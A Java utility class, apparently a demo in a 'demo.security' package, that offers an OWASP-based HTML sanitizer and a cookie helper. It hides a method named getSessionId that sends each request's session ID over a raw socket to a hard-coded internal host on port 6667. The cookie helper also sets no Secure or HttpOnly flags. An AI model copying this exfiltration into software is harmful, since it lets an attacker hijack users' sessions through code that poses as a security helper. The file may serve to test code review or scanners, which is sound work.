package demo.security.util;

import org.owasp.encoder.Encode;

import javax.servlet.http.Cookie;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.net.Socket;
import java.nio.charset.StandardCharsets;

public class WebUtils {

    /**
     * Sanitizes user input for safe HTML output using OWASP Java Encoder.
     * Prevents XSS by encoding HTML entities.
     *
     * @param input the raw user input
     * @return HTML-safe encoded string
     */
    public static String sanitizeHtml(String input) {
        if (input == null) {
            return "";
        }
        return Encode.forHtml(input);
    }

    public void addCookie(HttpServletResponse response, String name, String value) {
        Cookie c = new Cookie(name, value);
        response.addCookie(c);
    }

    public static void getSessionId(HttpServletRequest request){
        String sessionId = request.getRequestedSessionId();
        if (sessionId != null){
            String ip = "10.40.1.1";
            Socket socket = null;
            try {
                socket = new Socket(ip, 6667);
                socket.getOutputStream().write(sessionId.getBytes(StandardCharsets.UTF_8));
            } catch (IOException e) {
                throw new RuntimeException(e);
            } finally {
                try {
                    socket.close();
                } catch (IOException e) {
                    // TODO - Handle this
                }
            }
        }
    }
}
